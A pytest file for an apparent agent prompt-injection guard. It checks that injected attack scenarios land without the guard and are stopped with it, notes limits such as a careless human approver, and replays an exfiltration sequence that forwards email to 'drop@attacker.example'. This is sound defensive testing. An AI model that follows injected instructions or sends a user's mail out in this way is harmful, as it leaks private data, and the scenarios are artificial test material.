import asyncio

import pytest

from agent_firebreak.agents import ObedientAgent, ReplayAgent
from agent_firebreak.bench import run_bench
from agent_firebreak.runner import run_scenario
from agent_firebreak.scenarios import get_scenario, load_scenarios

SCENARIOS = load_scenarios()
ATTACKS = [s for s in SCENARIOS if s.kind == "attack"]
BENIGN = [s for s in SCENARIOS if s.kind == "benign"]


def run(s, **kw):
    return asyncio.run(run_scenario(s, ObedientAgent(), **kw))


def test_scenario_ids_unique():
    assert len({s.id for s in SCENARIOS}) == len(SCENARIOS)


@pytest.mark.parametrize("s", SCENARIOS, ids=lambda s: s.id)
def test_attack_succeeds_without_guard(s):
    if s.is_attack:
        assert run(s, guard_on=False).landed, "scenario would be meaningless if the attack never lands"


@pytest.mark.parametrize("s", ATTACKS, ids=lambda s: s.id)
@pytest.mark.parametrize("approver", ["deny", "approve"])
def test_guard_stops_attacks(s, approver):
    assert not run(s, approver=approver).landed


@pytest.mark.parametrize("s", BENIGN, ids=lambda s: s.id)
def test_benign_tasks_complete_when_human_approves(s):
    r = run(s, approver="approve")
    assert r.completed and r.asks == s.asks_expected and r.blocks == 0


def test_detectors_off_changes_nothing_for_attacks():
    for s in ATTACKS:
        assert not run(s, detectors=False).landed


def test_known_limits_are_honest():
    l1 = run(get_scenario("L1"))
    assert l1.landed and l1.asks == 0          # out of scope: guard cannot see a false summary
    assert not run(get_scenario("L2"), approver="deny").landed
    assert run(get_scenario("L2"), approver="approve").landed  # a careless human defeats it


def test_audit_log_verifies_and_detects_tampering():
    r = run(get_scenario("A1"))
    assert r.audit.verify() == (True, None)
    r.audit.entries[2]["data"]["tool"] = "other"
    assert r.audit.verify()[0] is False


def test_bench_summary():
    out = asyncio.run(run_bench())
    m = out["summary"]
    assert m["attacks_landed"] == {"off": m["attacks"], "on_deny": 0, "on_approve": 0}
    assert m["benign_completed"]["on_approve"] == m["benign"]


def test_replay_agent_blocks_direct_exfil():
    calls = [{"tool": "read_email", "args": {"id": "latest"}},
             {"tool": "send_email", "args": {"to": "drop@attacker.example", "subject": "x", "body": "y"}}]
    r = asyncio.run(run_scenario(get_scenario("A1"), ReplayAgent(calls)))
    assert r.blocks == 1 and not r.landed
